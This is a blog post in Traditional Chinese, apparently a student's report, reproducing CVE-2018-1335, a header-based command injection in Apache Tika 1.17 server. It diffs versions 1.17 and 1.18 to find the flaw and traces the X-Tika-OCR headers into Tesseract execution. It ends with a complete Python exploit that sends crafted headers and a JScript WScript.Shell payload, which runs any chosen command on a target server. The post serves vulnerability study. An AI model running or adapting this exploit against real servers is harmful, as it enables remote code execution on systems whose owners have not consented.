---
title: Apache Tika 1.17 CVE-2018-1335 復現
published: 2025-09-14
tags: [Cyber Security,CVE 復現]
category: Cyber Security
draft: false
image: 'image.png'
---



## 前言

因為計概報告會用到，於是就寫了這篇出來，如果有哪裡理解錯的話，歡迎與我討論 (畢竟這是我第一次分析一個 CVE 並且復現)，然後 Java 真的好噁心... 

## Apache Tika 1.17 介紹

- 提取檔案的元數據 & 內容
- 利用元數據理解檔案類型
- 可以透過內容辨識語言
- 支援多種檔案類型

## 提取 OCR 

上面有說到，Apache Tika 1.17 有用來解析元數據內容的功能，具體實現方式如下

```powershell=
PS C:\Users\dkri3c1\Downloads> curl.exe -X PUT http://localhost:9998/meta/ --header "Content-Type: image/tiff" --data-binary '@123.tiff'
"Fill Order","Normal"
"Compression","Uncompressed"
"tiff:ImageLength","160"
"Page Number","1 1"
"language",""
"Samples Per Pixel","4 samples/pixel"
"Strip Offsets","8"
"tiff:ResolutionUnit","cm"
"X Resolution","4953211/131072 dots per cm"
"Planar Configuration","Chunky (contiguous for each subsampling pixel)"
"Primary Chromaticities","5368709/8388608 11072963/33554432 5033165/16777216 5033165/8388608 5033165/33554432 16106127/268435456"
"Photometric Interpretation","RGB"
"File Size","302450 bytes"
"Rows Per Strip","160 rows/strip"
"File Name","apache-tika-5527451777009620192.tmp"
"tiff:BitsPerSample","8"
"Content-Type","image/tiff"
"Strip Byte Counts","302080 bytes"
"X-Parsed-By","org.apache.tika.parser.DefaultParser","org.apache.tika.parser.image.TiffParser"
"File Modified Date","星期日 九月 14 17:34:52 +08:00 2025"
"tiff:XResolution","37.790000915527344"
"tiff:SamplesPerPixel","4"
"Unknown tag (0x0152)","2"
"exif:PageCount","1"
"Image Height","160 pixels"
"Orientation","Top, left side (Horizontal / normal)"
"White Point","10492471/33554432 689963/2097152"
"tiff:Orientation","1"
"Image Width","472 pixels"
"Unknown tag (0x011f)","0"
"Unknown tag (0x011e)","0"
"Resolution Unit","cm"
"tiff:ImageWidth","472"
"tiff:YResolution","37.790000915527344"
"Bits Per Sample","8 8 8 8 bits/component/pixel"
"Y Resolution","4953211/131072 dots per cm"
```

本篇將探討這項功能在因為檢查不完善部分所造成的漏洞

## 環境

參考 https://blog.csdn.net/caiqiiqi/article/details/88532439

直接把裡面的連結載下來就好

## 檔案提取

先將 repo clone 下來

```bash=
git clone https://github.com/apache/tika.git
cd tika
```

然後把 repo 上的 tag 都 fetch 下來

```bash=
git fetch --all --tags
```

之後你就可以用 `git tag -l` 去看有哪些 tag

![image](https://hackmd.io/_uploads/Hkzipczjgg.png)

之後你可以用 `git checkout <version> ` 去看版本 (git checkout 可以將 branch 版本切到當時的版本及檔案內容)

這時候，你可以把兩個版本差異的檔案名稱 `diff` 出來

```bash=
PS C:\Users\dkri3c1\Desktop\CS_Project_\tika> git diff --name-only 1.17..1.18
CHANGES.txt
pom.xml
tika-app/pom.xml
tika-app/src/main/java/org/apache/tika/cli/BatchCommandLineBuilder.java
tika-app/src/main/java/org/apache/tika/cli/TikaCLI.java
tika-app/src/test/java/org/apache/tika/cli/TikaCLIBatchCommandLineTest.java
tika-app/src/test/java/org/apache/tika/cli/TikaCLITest.java
tika-app/src/test/java/org/apache/tika/extractor/TestEmbeddedDocumentUtil.java
tika-app/src/test/resources/test-data/test-documents.tgz
tika-batch/pom.xml
tika-bundle/pom.xml
tika-core/pom.xml
tika-core/src/main/java/org/apache/tika/extractor/EmbeddedDocumentUtil.java
tika-core/src/main/java/org/apache/tika/io/EndianUtils.java
tika-core/src/main/java/org/apache/tika/parser/RecursiveParserWrapper.java
tika-core/src/main/java/org/apache/tika/sax/SafeContentHandler.java
tika-core/src/main/java/org/apache/tika/sax/StandardOrganizations.java
tika-core/src/main/resources/org/apache/tika/mime/tika-mimetypes.xml
tika-core/src/test/java/org/apache/tika/TikaTest.java
tika-dl/pom.xml
tika-eval/pom.xml
tika-example/pom.xml
tika-java7/pom.xml
tika-java7/src/test/java/org/apache/tika/filetypedetector/TikaFileTypeDetectorTest.java
tika-langdetect/pom.xml
tika-nlp/pom.xml
tika-parent/pom.xml
tika-parsers/pom.xml
tika-parsers/src/main/java/org/apache/tika/parser/chm/accessor/ChmDirectoryListingSet.java
tika-parsers/src/main/java/org/apache/tika/parser/html/HtmlEncodingDetector.java
tika-parsers/src/main/java/org/apache/tika/parser/html/HtmlHandler.java
tika-parsers/src/main/java/org/apache/tika/parser/image/ImageParser.java
tika-parsers/src/main/java/org/apache/tika/parser/mail/MailContentHandler.java
tika-parsers/src/main/java/org/apache/tika/parser/mail/RFC822Parser.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ExcelExtractor.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/HSLFExtractor.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/OutlookExtractor.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ooxml/AbstractOOXMLExtractor.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ooxml/MetadataExtractor.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ooxml/OOXMLExtractorFactory.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ooxml/OOXMLParser.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ooxml/xps/XPSExtractorDecorator.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ooxml/xps/XPSPageContentHandler.java
tika-parsers/src/main/java/org/apache/tika/parser/microsoft/ooxml/xps/XPSTextExtractor.java
tika-parsers/src/main/java/org/apache/tika/parser/ner/corenlp/CoreNLPNERecogniser.java
tika-parsers/src/main/java/org/apache/tika/parser/ocr/TesseractOCRConfig.java
tika-parsers/src/main/java/org/apache/tika/parser/ocr/TesseractOCRParser.java
tika-parsers/src/main/java/org/apache/tika/parser/pdf/PDFParser.java
tika-parsers/src/main/java/org/apache/tika/parser/pdf/PDFParserConfig.java
tika-parsers/src/main/java/org/apache/tika/parser/pkg/CompressorParser.java
tika-parsers/src/main/java/org/apache/tika/parser/pkg/PackageParser.java
tika-parsers/src/main/java/org/apache/tika/parser/pkg/ZipContainerDetector.java
tika-parsers/src/main/java/org/apache/tika/parser/recognition/tf/TensorflowRESTRecogniser.java
tika-parsers/src/main/java/org/apache/tika/parser/recognition/tf/TensorflowRESTVideoRecogniser.java
tika-parsers/src/main/java/org/apache/tika/parser/utils/DataURIScheme.java
tika-parsers/src/main/java/org/apache/tika/parser/utils/DataURISchemeParseException.java
tika-parsers/src/main/java/org/apache/tika/parser/utils/DataURISchemeUtil.java
tika-parsers/src/main/resources/org/apache/tika/parser/html/StandardCharsets_unsupported_by_IANA.txt
tika-parsers/src/main/resources/org/apache/tika/parser/pdf/PDFParser.properties
tika-parsers/src/test/java/org/apache/tika/mime/TestMimeTypes.java
tika-parsers/src/test/java/org/apache/tika/parser/html/HtmlParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/mail/RFC822ParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/microsoft/ExcelParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/microsoft/PowerPointParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/microsoft/ooxml/OOXMLParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/microsoft/ooxml/SXSLFExtractorTest.java
tika-parsers/src/test/java/org/apache/tika/parser/microsoft/ooxml/xps/XPSParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/ocr/TesseractOCRConfigTest.java
tika-parsers/src/test/java/org/apache/tika/parser/pdf/PDFParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/pkg/CompressorParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/pkg/Seven7ParserTest.java
tika-parsers/src/test/java/org/apache/tika/parser/pkg/ZipContainerDetectorTest.java
tika-parsers/src/test/java/org/apache/tika/parser/utils/DataURISchemeParserTest.java
tika-parsers/src/test/resources/test-documents/full_encrypted.7z
tika-parsers/src/test/resources/test-documents/testBROTLI_compressed.br
tika-parsers/src/test/resources/test-documents/testEML_embedded_xhtml_and_img.eml
tika-parsers/src/test/resources/test-documents/testEXCEL_labels-govdocs-515858.xls
tika-parsers/src/test/resources/test-documents/testHTML_charset_utf16le.html
tika-parsers/src/test/resources/test-documents/testHTML_charset_utf8.html
tika-parsers/src/test/resources/test-documents/testHTML_embedded_img.html
tika-parsers/src/test/resources/test-documents/testHTML_embedded_img_in_js.html
tika-parsers/src/test/resources/test-documents/testMessageNews.txt
tika-parsers/src/test/resources/test-documents/testPPT_groups.ppt
tika-parsers/src/test/resources/test-documents/testPPT_groups.pptx
tika-parsers/src/test/resources/test-documents/testPPT_oleWorkbook.ppt
tika-parsers/src/test/resources/test-documents/testPPT_oleWorkbook.pptx
tika-parsers/src/test/resources/test-documents/testRFC822-txt-body
tika-parsers/src/test/resources/test-documents/testRFC822_dkim.eml
tika-parsers/src/test/resources/test-documents/testRFC822_simple_inline_body.txt
tika-parsers/src/test/resources/test-documents/testRFC822_x-.eml
tika-parsers/src/test/resources/test-documents/testXPS_various.xps
tika-parsers/src/test/resources/test-documents/testZSTD.zstd
tika-serialization/pom.xml
tika-server/Dockerfile
tika-server/README.md
tika-server/pom.xml
tika-server/src/main/java/org/apache/tika/server/resource/TikaResource.java
tika-server/src/test/java/org/apache/tika/server/TikaResourceTest.java
tika-translate/pom.xml
tika-xmp/pom.xml
```

也可以直接把檔案內容 diff 出來

```bash=
git diff 1.17..1.18 > diff_1.17_1.18.txt
```



## 漏洞分析

可以知道他是由於 Header 沒有做過濾，所以造成了 Cmdi

![image](https://hackmd.io/_uploads/BkReYYMjxg.png)

根據上面所說，我們可以去找 Version 1.17 和 1.18 diff 出來的東西，我們直接搜尋 header，可以發現檔案 `tika-server/src/main/java/org/apache/tika/server/resource/TikaResource.java` 在 1.18 時多了一個 `ALLOWABLE_HEADER_CHARS` 

![image](https://hackmd.io/_uploads/BJd1gaGsxl.png)

大概可以從這邊往下追會看到一個 function `processHeaderConfig`，可以在這個 function 上面看到關於這個 function 的參數設定

![image](https://hackmd.io/_uploads/H1LeUCGsee.png)

往下可以看到他把 key set 到上面的過程

![image](https://hackmd.io/_uploads/SJaXemEjge.png)



再往回可以看到關於 `HEADER_Prefix` 的東西，大概可以推斷它的對應方式應該是 `"X-Tika-OCR" : something`

![image](https://hackmd.io/_uploads/r1zv0MEixe.png)


![image](https://hackmd.io/_uploads/H1Dd6yNige.png)


這邊會做一些驗證，像是看你的對應方式是不是對的 `"X-Tika-OCR" : something`，並且呼叫 `processHeaderConfig`，再對 Header 做設定

![image](https://hackmd.io/_uploads/By0vOCMslx.png)

最後把 Header 的 key 傳上去 `doOCR` 的 `getTesseractPath()` 然後執行，

![image](https://hackmd.io/_uploads/r1P5zaQsxx.png)

你可能會想說 TesseractPath 預設是啥 ? 你可以在 `C:\Users\dkri3c1\Desktop\CS_Project_\tika-1.17\tika-1.17\tika-parsers\src\main\java\org\apache\tika\parser\ocr\TesseractOCRConfig.java` 找到他的設定

![image](https://hackmd.io/_uploads/rJOSjgNoxx.png)



Header Key 的地方對應到 `config.getTesseractPath()`，那你可能會想說，他不是會變成 `calc.exe input.png output.txt -l eng -psm 3 txt -c preserve_interword_spaces=1` 像是這樣的東西嗎?

其實本質上來說，無傷大雅，因為你在開這個檔案的時候，其實他只是把後面的東西當作參數在執行而已

以 notepad.exe 舉例


![image](https://hackmd.io/_uploads/HyMUv1Vigx.png)

顯然來說，單純開一個 notepad.exe 並不能為我們做到什麼，我們現在要做的是想辦法開啟檔案並且做到任意執行

既然我們都做到 command injection 了，為啥不直接用 `&` `|` 呢? 簡單來說就是我們跑 system 的 java function `ProcessBuilder` 並不會解析這些東西，所以要另想方法

![image](https://hackmd.io/_uploads/HkKRhy4sge.png)


往會看 code 會發現，我們可以控制的不是只有 `getTesseractPath()` 這個東西，還有 `config.language` 以及 `config.getPageSegMode`，我們先把程式跑起來看看

```bash=
"calc.exe"tesseract.exe C:UsersTestAppDataLocalTempapache-tika-3299124493942985299.tmp C:UsersTestAppDataLocalTempapache-tika-7317860646082338953.tmp -l eng -psm 1 txt -c preserve_interword_spaces=0
```

可以讓我們的可控參數 language `"X-Tika-OCRLanguage"` 用 cscript 的 `E:engine` 選用引擎來執行指令

如果你好奇這一個 Header 哪來的話，可以在下面找到

https://github.com/vaites/php-apache-tika/issues/31

![image](https://hackmd.io/_uploads/HJ2gbg4sex.png)

基本上就大功告成了，唯一需要注意的一點是，為了讓他被當成 OCR (圖片)來解析，所以我們需要在 Content-Type 的地方設定他是 `image/jp2`

![image](https://hackmd.io/_uploads/HyitMZNsxe.png)

並且在 body 的部分填上 cscript

```cmd=
var Exp = WScript.CreateObject("WScript.Shell")
var oExec = Exp.Run('cmd /c calc.exe')
```

附上 POC

Banner.py
```py=
import time

banner = '''░█████╗░██╗░░░██╗███████╗░░░░░░██████╗░░█████╗░░░███╗░░░█████╗░░░░░░░░░███╗░░██████╗░███████╗███████╗
██╔══██╗██║░░░██║██╔════╝░░░░░░╚════██╗██╔══██╗░████║░░██╔══██╗░░░░░░░████║░░╚════██╗██╔════╝██╔════╝
██║░░╚═╝╚██╗░██╔╝█████╗░░█████╗░░███╔═╝██║░░██║██╔██║░░╚█████╔╝█████╗██╔██║░░░█████╔╝██████╗░██████╗░
██║░░██╗░╚████╔╝░██╔══╝░░╚════╝██╔══╝░░██║░░██║╚═╝██║░░██╔══██╗╚════╝╚═╝██║░░░╚═══██╗╚════██╗╚════██╗
╚█████╔╝░░╚██╔╝░░███████╗░░░░░░███████╗╚█████╔╝███████╗╚█████╔╝░░░░░░███████╗██████╔╝██████╔╝██████╔╝
░╚════╝░░░░╚═╝░░░╚══════╝░░░░░░╚══════╝░╚════╝░╚══════╝░╚════╝░░░░░░░╚══════╝╚═════╝░╚═════╝░╚═════╝░


██████╗░░█████╗░░█████╗░
██╔══██╗██╔══██╗██╔══██╗
██████╔╝██║░░██║██║░░╚═╝
██╔═══╝░██║░░██║██║░░██╗
██║░░░░░╚█████╔╝╚█████╔╝
╚═╝░░░░░░╚════╝░░╚════╝░


███╗░░░███╗░█████╗░██████╗░███████╗  ██████╗░██╗░░░██╗
████╗░████║██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚██╗░██╔╝
██╔████╔██║███████║██║░░██║█████╗░░  ██████╦╝░╚████╔╝░
██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░  ██╔══██╗░░╚██╔╝░░
██║░╚═╝░██║██║░░██║██████╔╝███████╗  ██████╦╝░░░██║░░░
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░░░░╚═╝░░░

██████╗░██╗░░██╗██████╗░██╗██████╗░░█████╗░░░███╗░░
██╔══██╗██║░██╔╝██╔══██╗██║╚════██╗██╔══██╗░████║░░
██║░░██║█████═╝░██████╔╝██║░█████╔╝██║░░╚═╝██╔██║░░
██║░░██║██╔═██╗░██╔══██╗██║░╚═══██╗██║░░██╗╚═╝██║░░
██████╔╝██║░╚██╗██║░░██║██║██████╔╝╚█████╔╝███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░░╚════╝░╚══════╝

Reference: https://www.exploit-db.com/exploits/46540

Remember to install requests : pip3 install requests

'''

time.sleep(1)

usage = "python3 <filename> <ip> <port> <command>"
example = "python3 <exp.py> <loaclhost> <9998> <calc.exe>"
```

exp.py
```py=
import requests
import sys
import Banner 

def print_Banner():
    return Banner.banner

def usage():
    return Banner.usage

def example():
    return Banner.example

def main():
    print(print_Banner())
    print()
    print(f"🌰 Usage: {usage()}")
    print()
    print(f"🛠️ Example: {example()}")
    print()

    if len(sys.argv) != 4:
        print(f"❌ Something error , look at the usage:  {usage()}")
        return # let program end up early

    host = sys.argv[1]
    port = sys.argv[2]
    command = sys.argv[3]
    url = f"http://{host}:{port}/meta"
    header = {
              "Connection": "close",
              "X-Tika-OCRTesseractPath": "\"cscript\"",
              "X-Tika-OCRLanguage": "//E:Jscript",  
              "Content-Type": "image/jp2"
              }
    dat = f"""var Exp = WScript.CreateObject("WScript.Shell");
    var oExec = Exp.Run('cmd /c {command}');""" 


    try:
        requests.put(url,headers=header,data=dat)
    except:
        requests.put(url,headers=header,data=dat)

main()
```

## Reference

https://github.com/vaites/php-apache-tika/issues/31

https://cloud.tencent.com/developer/article/1512079

https://juejin.cn/post/6844903800738676749

https://blog.csdn.net/caiqiiqi/article/details/88532439